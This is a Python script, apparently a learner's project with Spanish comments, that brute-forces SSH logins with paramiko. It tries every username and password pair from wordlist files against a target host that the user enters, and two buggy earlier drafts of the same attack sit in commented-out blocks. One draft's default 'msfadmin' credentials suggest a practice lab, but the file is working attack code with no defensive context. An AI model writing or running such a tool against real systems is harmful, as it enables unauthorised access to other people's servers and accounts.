# import paramiko, sys, os, termcolor
"""
import threading, time

stop_flag = 0

def ssh_connectUser(usernames):

    global stop_flag
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(host, port=22, username=usernames)
        stop_flag = 1
        print(termcolor.colored(('[+] Found Username: ' + usernames), 'green'))

    except:
        print(termcolor.colored(('[-] Incorrect Username: ' + usernames), 'red'))
    ssh.close()

def ssh_connect(password):

    global stop_flag
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(host, port=22, username=usernames, password=password)
        stop_flag = 1
        print(termcolor.colored(('[+] Found Password: ' + password + ', For Account: ' + usernames), 'green'))

    except:
        print(termcolor.colored(('[-] Incorrect Login: ' + password), 'red'))
    ssh.close()

 

host = input('[+] Target Address: ')
# username = input('[+] SSH Username: ')
# input_file = input('[+] Passwords File: ')
usernames = "usernames.txt"
input_file = "passwords.txt"
print('\n')

if os.path.exists(usernames) == False:
    print('[!!] That File/Path Doesnt Exist')
    sys.exit(1)

if os.path.exists(input_file) == False:
    print('[!!] That File/Path Doesnt Exist')
    sys.exit(1)

#print('* * * Starting Threaded SSH Bruteforce On ' + host + ' With Account: ' + usernames + '* * *')

with open(usernames, 'r') as file:
    for line in file.readlines():
        if stop_flag == 1:
            t.join()
            exit()

        usernames = line.strip()
        t = threading.Thread(target=ssh_connect, args=(usernames,))
        t.start()
        time.sleep(0.5)

with open(input_file, 'r') as file:
    for line in file.readlines():
        if stop_flag == 1:
            t.join()
            exit()

        password = line.strip()
        t = threading.Thread(target=ssh_connect, args=(password,))
        t.start()
        time.sleep(0.5)
"""
#segundo codigo
"""
import paramiko

def ssh_connect(username, password, target_host, port):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=target_host, port=port, username=username, password=password, timeout=50)
        print(f"[+] Successful Login: {username}:{password}")
        client.close()
    except paramiko.AuthenticationException:
        print(f"[-] Incorrect Login: {username}")

host = input('[+] Target Address: ')
# username = input('[+] SSH Username: ')
# input_file = input('[+] Passwords File: ')
usernames = "msfadmin"
input_file = "msfadmin"
port = 22

for user in usernames:
    for pwd in input_file:
        ssh_connect(user, pwd, host, port)
"""
import paramiko

def ssh_connect(username, password, target_host, port):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=target_host, port=port, username=username, password=password, timeout=50)
        print(f"[+] Successful Login: {username}:{password}")
        client.close()
    except paramiko.AuthenticationException:
        print(f"[-] Incorrect Login: {username}")

host = input('[+] Target Address: ')
usernames_file = "usernames.txt"
passwords_file = "passwords.txt"
port = 22

try:
    with open(usernames_file, 'r') as users:
        for user in users:
            with open(passwords_file, 'r') as passwords:
                for pwd in passwords:
                    ssh_connect(user.strip(), pwd.strip(), host, port)
except FileNotFoundError:
    print("No se pudo encontrar el archivo de nombres de usuario o contraseñas.")

